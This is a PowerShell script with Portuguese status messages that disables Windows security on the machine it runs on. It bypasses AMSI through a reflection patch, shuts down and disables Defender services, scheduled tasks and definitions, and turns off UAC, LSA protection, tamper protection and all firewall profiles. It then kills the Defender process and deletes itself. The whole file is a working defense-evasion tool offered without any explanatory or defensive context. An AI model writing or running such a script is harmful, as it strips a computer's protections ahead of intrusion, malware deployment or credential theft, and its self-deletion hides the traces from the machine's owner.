#Requires -RunAsAdministrator

[Runtime.InteropServices.Marshal]::WriteInt32(
    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField(
        'amsiContext', 
        [Reflection.BindingFlags]'NonPublic,Static'
    ).GetValue($null), 0
)

$null = New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Force -ErrorAction SilentlyContinue
$null = New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -PropertyType DWord -Force

$services = @('WinDefend', 'Sense', 'SecurityHealthService', 'wscsvc')
foreach ($service in $services) {
    if (Get-Service $service -ErrorAction SilentlyContinue) {
        Stop-Service $service -Force -ErrorAction SilentlyContinue
        Set-Service $service -StartupType Disabled -ErrorAction SilentlyContinue
    }
}

if (Test-Path "$env:ProgramFiles\Windows Defender\MpCmdRun.exe") {
    Start-Process "$env:ProgramFiles\Windows Defender\MpCmdRun.exe" -ArgumentList "-RemoveDefinitions -All" -Wait -WindowStyle Hidden
}

$registrySettings = @(
    @{Path="HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"; Name="EnableLUA"; Value=0},
    @{Path="HKLM:\System\CurrentControlSet\Control\Lsa"; Name="RunAsPPL"; Value=0},
    @{Path="HKLM:\System\CurrentControlSet\Control\Lsa"; Name="LsaCfgFlags"; Value=0},
    @{Path="HKLM:\SOFTWARE\Microsoft\Windows Defender\Features"; Name="TamperProtection"; Value=4}
)

foreach ($setting in $registrySettings) {
    if (-not (Test-Path $setting.Path)) { 
        $null = New-Item -Path $setting.Path -Force -ErrorAction SilentlyContinue
    }
    $null = New-ItemProperty -Path $setting.Path -Name $setting.Name -Value $setting.Value -PropertyType DWord -Force -ErrorAction SilentlyContinue
}

Set-NetFirewallProfile -All -Enabled False -ErrorAction SilentlyContinue
$null = netsh advfirewall set allprofiles state off 2>&1

$tasks = @(
    "Windows Defender Cache Maintenance",
    "Windows Defender Cleanup",
    "Windows Defender Scheduled Scan",
    "Windows Defender Verification"
)

foreach ($task in $tasks) {
    Disable-ScheduledTask -TaskName $task -TaskPath "\Microsoft\Windows\Windows Defender\" -ErrorAction SilentlyContinue
}

taskkill /f /im MsMpEng.exe /im SecurityHealthService.exe 2>&1 | Out-Null

Write-Host "`n[+] DEFENDER DESATIVADO COM SUCESSO!" -ForegroundColor Green
Write-Host "[+] Firewall: DESATIVADO" -ForegroundColor Yellow
Write-Host "[+] Proteção LSA: DESATIVADA" -ForegroundColor Yellow
Write-Host "[+] UAC: DESATIVADO" -ForegroundColor Yellow
Write-Host "`n[!] Reinicie o computador para conclusão total`n" -ForegroundColor Cyan

Remove-Item -LiteralPath $MyInvocation.MyCommand.Path -Force -ErrorAction SilentlyContinue
